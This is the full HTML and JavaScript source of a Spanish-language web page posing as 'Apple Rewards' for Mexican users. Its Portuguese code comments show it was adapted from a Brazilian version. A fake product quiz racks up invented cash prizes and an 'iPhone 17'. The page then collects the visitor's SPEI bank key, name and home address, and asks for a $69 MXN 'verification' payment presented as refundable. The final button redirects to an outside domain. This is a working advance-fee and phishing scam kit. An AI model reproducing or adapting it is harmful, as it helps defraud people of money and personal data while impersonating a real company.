<!DOCTYPE html>
<html lang="es-MX">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple Rewards</title>

<style>
    body {
        background: #f5f5f7;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: flex-start;
        min-height: 100vh;
    }

    .shine {
        animation: shine 0.6s ease-out;
    }

    @keyframes shine {
        0% { text-shadow: 0 0 0px gold; }
        50% { text-shadow: 0 0 14px gold; }
        100% { text-shadow: 0 0 0px gold; }
    }

    .container, .resgate-container, .taxa-container, .envio-container {
        width: 95%;
        max-width: 420px;
        background: #ffffff;
        margin-top: 25px;
        border-radius: 22px;
        padding: 25px;
        box-shadow: 0px 8px 22px rgba(0,0,0,0.08);
    }
    
    .taxa-container {
        padding: 0px; 
        margin-top: 0;
        border-radius: 0;
        box-shadow: none;
        max-width: 500px;
    }
    
    .envio-container {
        margin-top: 0;
        border-radius: 0;
        box-shadow: none;
        max-width: 500px;
    }

    /* BARRA DE PROGRESSO */
    .progress-wrapper {
        width: 100%;
        height: 10px;
        background: #d9d9d9;
        border-radius: 20px;
        overflow: hidden;
        margin-bottom: 20px;
    }

    .progress-bar {
        height: 100%;
        width: 0%;
        background: #0071e3;
        transition: 0.35s;
    }

    .topbar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 25px;
    }

    .logo {
        display: flex;
        align-items: center;
        gap: 8px;
        font-weight: 600;
        font-size: 18px;
    }

    .logo img {
        width: 26px;
    }

    .money-box {
        background: #f2f2f2;
        padding: 6px 12px;
        border-radius: 12px;
        font-weight: 600;
        font-size: 14px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .btn-sac {
        background: #000;
        color: #fff;
        padding: 6px 14px;
        border-radius: 10px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
    }

    h2 {
        text-align: center;
        font-size: 20px;
        font-weight: 700;
        color: #111;
        margin-bottom: 10px;
    }

    .subtitle {
        text-align: center;
        color: #555;
        margin-bottom: 20px;
        font-size: 14px;
    }

    .option {
        background: #fafafa;
        padding: 14px;
        border-radius: 14px;
        border: 1px solid #e5e5e5;
        display: flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 12px;
        cursor: pointer;
        transition: 0.2s;
        font-weight: 500;
    }

    .option:hover {
        background: #eaeaea;
    }

    button {
        width: 100%;
        background: #000;
        color: #fff;
        padding: 14px;
        border: none;
        border-radius: 14px;
        font-size: 15px;
        font-weight: 700;
        margin-top: 18px;
        cursor: pointer;
        opacity: 0.7;
    }

    button.enabled {
        opacity: 1;
    }

    .bonus {
        text-align: center;
        margin-top: 10px;
        font-size: 13px;
        color: #0071e3;
    }

    footer {
        margin-top: 25px;
        text-align: center;
        font-size: 11px;
        color: #777;
    }

    footer span {
        color: #c90000;
        font-weight: 600;
    }

    .popup {
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: rgba(0,0,0,0.55);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .popup-box {
        background: #fff;
        width: 90%;
        max-width: 360px;
        border-radius: 20px;
        padding: 25px;
        text-align: center;
    }

    .popup-box h3 {
        font-size: 20px;
        font-weight: 700;
        margin-bottom: 10px;
    }

    .popup-valor {
        font-size: 32px;
        font-weight: 800;
        color: #00c851;
        margin-bottom: 15px;
    }

    .popup-btn {
        background: #000;
        color: #fff;
        border: none;
        width: 100%;
        padding: 14px;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 700;
        cursor: pointer;
    }

    .popup-final .popup-box {
        background: #6a0dad;
        color: #fff;
    }

    .popup-final .popup-btn {
        background: #fff;
        color: #6a0dad;
    }

    .resgate-container, .taxa-container, .envio-container { display:none; }

    .resgate-title {
        font-size:22px;
        font-weight:700;
        text-align:center;
        margin-bottom:15px;
    }

    .saldo-box {
        background:#000;
        padding:12px;
        border-radius:16px;
        color:#fff;
        font-size:18px;
        text-align:center;
        margin-bottom:22px;
        font-weight:700;
    }

    .valores-box {
        display:grid;
        grid-template-columns:1fr 1fr;
        gap:12px;
        margin-bottom:25px;
    }

    .valor-btn {
        background:#f5f5f7;
        border:1px solid #ccc;
        padding:14px;
        border-radius:12px;
        text-align:center;
        font-size:15px;
        font-weight:600;
        cursor:pointer;
        transition:0.3s;
    }

    .valor-btn:hover { background:#e7e7ea; }

    select, input {
        width:100%;
        padding:12px;
        border-radius:12px;
        border:1px solid #ccc;
        margin-bottom:18px;
        font-size:15px;
    }

    #btnSaque {
        background:#0071e3;
        font-size:16px;
        border-radius:12px;
    }

    /* ESTILOS DA TELA DE TAXA DE SEGURAN√áA */
    .taxa-header {
        text-align: center;
        padding: 40px 25px 30px;
        background: #fff;
    }

    .taxa-logo-apple {
        width: 30px;
        margin-bottom: 20px;
    }
    
    .taxa-icon-check {
        width: 35px;
        height: 35px;
        margin: 0 auto 10px;
        color: #0071e3;
    }

    .taxa-title {
        font-size: 26px;
        font-weight: 700;
        margin-bottom: 15px;
        color: #1c1c1c;
    }

    .taxa-description {
        font-size: 16px;
        line-height: 1.5;
        color: #333;
        margin-bottom: 20px;
    }

    .taxa-reembolso {
        font-size: 15px;
        color: #555;
        margin-bottom: 30px;
    }

    .taxa-item-list {
        padding: 0 25px 25px;
        background: #fff;
    }

    .taxa-item {
        display: flex;
        align-items: flex-start;
        padding: 16px;
        background: #f5f5f7;
        border-radius: 12px;
        margin-bottom: 15px;
    }

    .taxa-item-icon {
        width: 24px;
        height: 24px;
        margin-right: 15px;
        color: #000;
        flex-shrink: 0;
    }

    .taxa-item-content {
        flex-grow: 1;
    }

    .taxa-item-title {
        font-size: 16px;
        font-weight: 600;
        color: #1c1c1c;
        margin-bottom: 4px;
    }

    .taxa-item-text {
        font-size: 14px;
        color: #555;
    }

    .taxa-btn-sacar {
        width: 100%;
        background: #0071e3;
        color: #fff;
        padding: 18px;
        border: none;
        border-radius: 12px;
        font-size: 18px;
        font-weight: 700;
        cursor: pointer;
        margin: 0 auto 30px;
        display: block;
        max-width: 90%;
    }
    
    /* ESTILOS DA NOVA TELA DE ENVIO */
    .envio-header {
        text-align: center;
        padding-bottom: 20px;
    }

    .envio-header h2 {
        font-size: 24px;
        margin-bottom: 5px;
    }

    .envio-header p {
        font-size: 15px;
        color: #666;
    }

    .envio-icon-iphone {
        width: 70px;
        height: 70px;
        color: #1c1c1c;
        margin-bottom: 15px;
    }

    .envio-form label {
        display: block;
        font-size: 14px;
        font-weight: 600;
        color: #333;
        margin-bottom: 6px;
        margin-top: 15px;
    }

    .envio-form input {
        width: calc(100% - 24px);
        padding: 12px;
        border-radius: 10px;
        border: 1px solid #ddd;
        font-size: 16px;
        box-sizing: border-box;
    }

    .envio-btn-finalizar {
        background: #0071e3;
        font-size: 17px;
        border-radius: 12px;
        padding: 16px;
        margin-top: 30px;
    }
</style>
</head>

<body>

<audio id="coinSound">
    <source src="https://assets.mixkit.co/sfx/preview/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
</audio>

<div class="container" id="quizContainer">

    <div class="topbar">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
            Apple
        </div>

        <div class="money-box">
            <span id="saldoTopo">$0.00 MXN</span>
            <div class="btn-sac">RETIRAR</div>
        </div>
    </div>

    <div class="progress-wrapper">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <h2 id="question-title"></h2>
    <div class="subtitle">Selecciona una opci√≥n para continuar:</div>
    <div id="options"></div>

    <button id="continuar">Continuar</button>

    <div class="bonus">Participa por un bono especial de Apple</div>

    <footer>
        Al participar en las actividades de recompensa aceptas nuestros <span>T√©rminos y Condiciones</span>.
    </footer>

</div>

<div class="resgate-container" id="resgateContainer">

    <div class="topbar">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
            Apple
        </div>

        <div class="money-box">
            $1,930.31 MXN
        </div>
    </div>

    <div class="resgate-title">Cobrar Recompensa</div>

    <div class="saldo-box">Saldo disponible: $1,930.31 MXN</div>

    <h3 style="font-size:16px;font-weight:600;">√öltimas recompensas</h3>

    <div class="valores-box">
        <div class="valor-btn">$36.23 MXN</div>
        <div class="valor-btn">$99.70 MXN</div>
        <div class="valor-btn">$193.55 MXN</div>
        <div class="valor-btn">$1,930.31 MXN</div>
    </div>

    <select id="tipoChave">
        <option>Selecciona tipo de clave</option>
        <option>Clave aleatoria</option>
        <option>N√∫mero de celular</option>
        <option>Correo electr√≥nico</option>
        <option>CURP</option>
    </select>

    <input type="text" id="chavePix" placeholder="Ingresa tu Clave SPEI">

    <button id="btnSaque">REALIZAR RETIRO AHORA</button>
</div>

<div class="taxa-container" id="taxaContainer">
    <div class="taxa-header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="taxa-logo-apple" alt="Apple">
        
        <svg xmlns="http://www.w3.org/2000/svg" class="taxa-icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
            <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>

        <div class="taxa-title">Verificaci√≥n de identidad</div>
        
        <p class="taxa-description">
            Siguiendo las reglas de seguridad bancaria, solicitamos una confirmaci√≥n de identidad de <strong>$69 MXN</strong> (‚âà R$19,98) para validar a los participantes.
        </p>
        
        <p class="taxa-reembolso">
            El importe ser√° reembolsado inmediatamente al saldo acumulado (usualmente en 1‚Äì5 minutos).
        </p>
    </div>

    <div class="taxa-item-list">
        
        <div class="taxa-item">
            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 6 12 12 16 14"></polyline>
            </svg>
            <div class="taxa-item-content">
                <div class="taxa-item-title">Pago requerido</div>
                <div class="taxa-item-text">Necesario para procesar la transferencia por SPEI y validar tu retiro.</div>
            </div>
        </div>

        <div class="taxa-item">
            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="1 4 1 10 7 10"></polyline>
                <polyline points="23 20 23 14 17 14"></polyline>
                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
            </svg>
            <div class="taxa-item-content">
                <div class="taxa-item-title">Importe reembolsable</div>
                <div class="taxa-item-text">Recibir√°s los <strong>$69 MXN</strong> de vuelta despu√©s de la verificaci√≥n.</div>
            </div>
        </div>
        
        <div class="taxa-item">
            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <div class="taxa-item-content">
                <div class="taxa-item-title">Seguridad garantizada</div>
                <div class="taxa-item-text">El pago est√° protegido por los protocolos bancarios y la verificaci√≥n de identidad.</div>
            </div>
        </div>
        
        <button class="taxa-btn-sacar" id="btnTaxaSacar">REALIZAR PAGO DE VERIFICACI√ìN</button>
    </div>
</div>

<div class="envio-container" id="envioContainer">
    <div class="envio-header">
        <svg xmlns="http://www.w3.org/2000/svg" class="envio-icon-iphone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
            <line x1="12" y1="18" x2="12" y2="18"></line>
        </svg>

        <h2>üéâ ¬°Felicidades! √öltimo paso para tu iPhone.</h2>
        <p>Confirmaste tu elegibilidad. Ahora necesitamos tus datos para <strong>env√≠o prioritario</strong> del iPhone y la transferencia por SPEI de <strong>$1,930.31 MXN</strong> (‚âà R$559,51).</p>
        <p>Llena la direcci√≥n exacta para que nuestro equipo log√≠stico pueda procesar tu env√≠o.</p>
    </div>

    <form class="envio-form">
        <label for="nomeCompleto">Nombre completo</label>
        <input type="text" id="nomeCompleto" placeholder="Tu nombre" required>

        <label for="cep">C√≥digo Postal (CP)</label>
        <input type="text" id="cep" placeholder="00000" required>

        <label for="endereco">Direcci√≥n (Calle, N√∫mero)</label>
        <input type="text" id="endereco" placeholder="Ej: Calle de las Manzanas, 100" required>

        <label for="bairro">Colonia / Barrio</label>
        <input type="text" id="bairro" placeholder="Ej: Centro" required>

        <label for="cidade">Ciudad</label>
        <input type="text" id="cidade" placeholder="Ej: Ciudad de M√©xico" required>

        <label for="estado">Estado (MX)</label>
        <input type="text" id="estado" placeholder="Ej: CDMX" required>

        <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENV√çO Y RECIBIR SPEI</button>
    </form>
</div>

<div class="popup" id="popup">
    <div class="popup-box">
        <h3>¬°Recompensa obtenida!</h3>
        <div class="popup-valor" id="popupValor">$0.00 MXN (‚âà R$0,00)</div>
        <button class="popup-btn" id="popupBtn">Seguir recibiendo</button>
    </div>
</div>

<div class="popup popup-final" id="popupFinal">
    <div class="popup-box">
        <h3>¬°Felicidades!</h3>
        <p style="font-size:17px;font-weight:500;margin-bottom:10px;">
            Completaste el quiz y ganaste:
        </p>
        <div class="popup-valor" style="color:#00ff8c;font-size:35px;">
            $1,930.31 MXN + un iPhone 17
        </div>
        <button class="popup-btn" id="finalBtn">Recibir recompensa</button>
    </div>
</div>

<div class="popup" id="popupConquista">
    <div class="popup-box" style="max-width:400px;border-radius:25px;padding:30px;background:#fefefe;">
        <h3 style="font-size:24px;font-weight:700;color:#1c1c1c;margin-bottom:15px;">üéâ ¬°Felicidades por tu logro!</h3>
        <p style="font-size:16px;color:#333;margin-bottom:15px;line-height:1.5;">
            Acabas de ganar un <strong>iPhone 17</strong> y <strong>$2,000.93 MXN</strong> en tu Clave SPEI (‚âà R$579,98).
        </p>
        <p style="font-size:15px;color:#555;margin-bottom:20px;line-height:1.5;">
            Nuestro equipo log√≠stico est√° preparando tu iPhone y el env√≠o se realizar√° pronto.
        </p>
        <p style="font-size:15px;color:#555;margin-bottom:25px;line-height:1.5;">
            Para recibir tu SPEI, haz clic en el bot√≥n de abajo y realiza el pago de verificaci√≥n. Esto confirma que la clave SPEI es tuya y valida el retiro inmediato.
        </p>
        <button class="popup-btn" id="btnConquista" style="background:#0071e3;color:#fff;font-size:16px;font-weight:700;padding:16px;border-radius:14px;cursor:pointer;border:none;width:100%;">
            Recibir Recompensa Ahora
        </button>
    </div>
</div>

<script>
/*
  Adaptaci√≥n MXN (Op√ß√£o A)
  - Mantive toda a l√≥gica original
  - Valores convertidos a MXN usando 1 BRL ‚âà 3.45 MXN
  - Exibi√ß√£o: "$X MXN (‚âà R$Y,YY)"
*/

const coinSound = document.getElementById("coinSound");

// Perguntas adaptadas para M√©xico (espa√±ol mexicano)
const perguntas = [
    {
        titulo: "¬øQu√© producto Apple usas m√°s a diario?",
        opcoes: ["üì± iPhone", "üíª MacBook", "‚åö Apple Watch", "üéß AirPods"]
    },
    {
        titulo: "¬øQu√© color de iPhone prefieres?",
        opcoes: ["‚ö™ Blanco", "‚ö´ Negro", "ü©∂ Titan Natural", "üîµ Azul"]
    },
    {
        titulo: "¬øC√≥mo calificas la bater√≠a de tu iPhone?",
        opcoes: ["üîã Excelente", "üëç Buena", "üôÇ Regular", "üòï Podr√≠a mejorar"]
    },
    {
        titulo: "¬øComprar√≠as un Apple Vision Pro si estuviera barato?",
        opcoes: ["ü§© S√≠, sin duda", "üòé Quiz√°", "ü§î No estoy seguro", "üôÖ‚Äç‚ôÇÔ∏è No, gracias"]
    },
    {
        titulo: "¬øQu√© servicio de Apple usas con m√°s frecuencia?",
        opcoes: ["üéµ Apple Music", "üì¶ iCloud", "üì∫ Apple TV+", "üéÆ Apple Arcade"]
    }
];

// Valores convertidos a MXN (1 BRL ‚âà 3.45 MXN) ‚Äî correspondem ao array original
const valores = [
    { mxn: 132.89, brl: 38.52 },  // pregunta 1
    { mxn: 147.35, brl: 42.71 },  // pregunta 2
    { mxn: 114.47, brl: 33.18 },  // pregunta 3
    { mxn: 158.35, brl: 45.90 },  // pregunta 4
    { mxn: 1377.24, brl: 399.20 } // pregunta 5
];

// Valores adicionales / totales convertidos
const taxaVerificacion = { mxn: 68.93, brl: 19.98 };      // ~$69 MXN (‚âà R$19,98)
const saldoFinal = { mxn: 1930.31, brl: 559.51 };         // R$559,51 -> $1,930.31 MXN
const popupConquistaValor = { mxn: 2000.93, brl: 579.98 } // R$579,98 -> $2,000.93 MXN

let etapa = 0;
let selected = false;
let saldoAtual = 0; // em MXN

const title = document.getElementById("question-title");
const optionsBox = document.getElementById("options");
const btn = document.getElementById("continuar");

const popup = document.getElementById("popup");
const popupValor = document.getElementById("popupValor");
const popupBtn = document.getElementById("popupBtn");

const popupFinal = document.getElementById("popupFinal");
const finalBtn = document.getElementById("finalBtn");

const saldoTopo = document.getElementById("saldoTopo");

const progressBar = document.getElementById("progressBar");

// Elementos das Telas
const btnSaque = document.getElementById("btnSaque");
const resgateContainer = document.getElementById("resgateContainer");
const taxaContainer = document.getElementById("taxaContainer");
const envioContainer = document.getElementById("envioContainer"); 
const quizContainer = document.getElementById("quizContainer"); 

const btnTaxaSacar = document.getElementById("btnTaxaSacar");
const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio");

const popupConquista = document.getElementById("popupConquista");
const btnConquista = document.getElementById("btnConquista");

// Fun√ß√µes de formata√ß√£o
function formatMXN(n) {
    // Usa separador de milhares e ponto decimal (padr√£o MX)
    return "$" + Number(n).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2}) + " MXN";
}
function formatBRL(n) {
    // Mostra com v√≠rgula decimal como no PT-BR
    return "‚âà R$" + Number(n).toFixed(2).replace(".", ",");
}

function atualizarProgresso() {
    const progresso = ((etapa) / perguntas.length) * 100;
    progressBar.style.width = progresso + "%";
}

function brilho(el) {
    el.classList.remove("shine");
    void el.offsetWidth;
    el.classList.add("shine");
}

function carregarPergunta() {
    atualizarProgresso();

    const q = perguntas[etapa];
    title.innerText = q.titulo;
    optionsBox.innerHTML = "";
    selected = false;
    btn.classList.remove("enabled");

    q.opcoes.forEach(op => {
        const div = document.createElement("div");
        div.className = "option";
        div.innerHTML = op;
        div.onclick = () => {
            document.querySelectorAll(".option").forEach(o => o.style.border = "1px solid #e5e5e5");
            div.style.border = "2px solid #000";
            selected = true;
            btn.classList.add("enabled");
        };
        optionsBox.appendChild(div);
    });
}

btn.onclick = () => {
    if (!selected) return;

    const valorObj = valores[etapa];
    popupValor.innerText = formatMXN(0) + " (" + formatBRL(0) + ")";
    popup.style.display = "flex";

    // Toca som de moeda
    try { coinSound.currentTime = 0; coinSound.play(); } catch(e){}

    let atual = 0;
    const passo = valorObj.mxn / 25;
    const anim = setInterval(() => {
        atual += passo;
        if (atual >= valorObj.mxn) {
            atual = valorObj.mxn;
            clearInterval(anim);
        }
        // Atualiza popup com MXN e BRL aproximado
        const brlEquiv = valorObj.brl * ((atual/valorObj.mxn)); // proporcional em BRL
        popupValor.innerText = formatMXN(atual) + " (" + formatBRL(brlEquiv) + ")";
        brilho(popupValor);
    }, 30);

    saldoAtual += valorObj.mxn;
    // Atualiza topo com saldo acumulado
    // Para mostrar o BRL equivalente fazemos a divis√£o pela taxa impl√≠cita (brl = original)
    // Para exibir aproximado, calculamos a BRL proporcional
    const brlTotalEstimado = (saldoAtual / valorObj.mxn) * valorObj.brl; // aproxima√ß√£o proporcional
    // Em vez dessa aproxima√ß√£o confusa, vamos converter somando os brl originais:
    // (Manter c√°lculo simples: mostrar MXN e BRL aproximado dividindo por 3.45)
    const brlFromMxn = saldoAtual / 3.45;
    saldoTopo.innerText = formatMXN(saldoAtual) + " (" + formatBRL(brlFromMxn) + ")";
    brilho(saldoTopo);
};

popupBtn.onclick = () => {
    popup.style.display = "none";
    etapa++;

    if (etapa >= perguntas.length) {
        progressBar.style.width = "100%";

        popupFinal.style.display = "flex";

        try { coinSound.currentTime = 0; coinSound.play(); } catch(e){}

        return;
    }

    btn.classList.remove("enabled");
    carregarPergunta();
};

finalBtn.onclick = () => {
    quizContainer.style.display = "none";
    document.getElementById("popupFinal").style.display = "none";
    resgateContainer.style.display = "block";

    try { coinSound.currentTime = 0; coinSound.play(); } catch(e){}
};

// 1. Bot√£o da Tela de Resgate -> Tela de Taxa
btnSaque.onclick = () => {
    resgateContainer.style.display = "none";
    taxaContainer.style.display = "block";
};

// 2. Bot√£o da Tela de Taxa -> Tela de Envio
btnTaxaSacar.onclick = () => {
    // Aqui voc√™ acionaria o pagamento ‚Äî por enquanto apenas avan√ßa para a tela de envio
    taxaContainer.style.display = "none";
    envioContainer.style.display = "block";
};

// 3. Bot√£o da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
btnFinalizarEnvio.onclick = () => {
    envioContainer.style.display = "none";
    popupConquista.style.display = "flex";
};

// 4. Bot√£o do Pop-up de Conquista -> Redirecionamento Final
btnConquista.onclick = () => {
    // Mantive o redirecionamento original
    window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
};

// Inicializa valores visuais
function inicializaValoresUI() {
    // Atualiza valores exibidos na tela de resgate
    // Topo j√° inicializado com 0
    document.querySelectorAll('.valor-btn')[0].innerText = formatMXN(36.23);
    document.querySelectorAll('.valor-btn')[1].innerText = formatMXN(99.70);
    document.querySelectorAll('.valor-btn')[2].innerText = formatMXN(193.55);
    document.querySelectorAll('.valor-btn')[3].innerText = formatMXN(1930.31);

    // Substitui os textos em popups finais que continham BRL por MXN + BRL aproximado (j√° feitos no HTML)
}

inicializaValoresUI();
carregarPergunta();
</script>

</body>
</html>
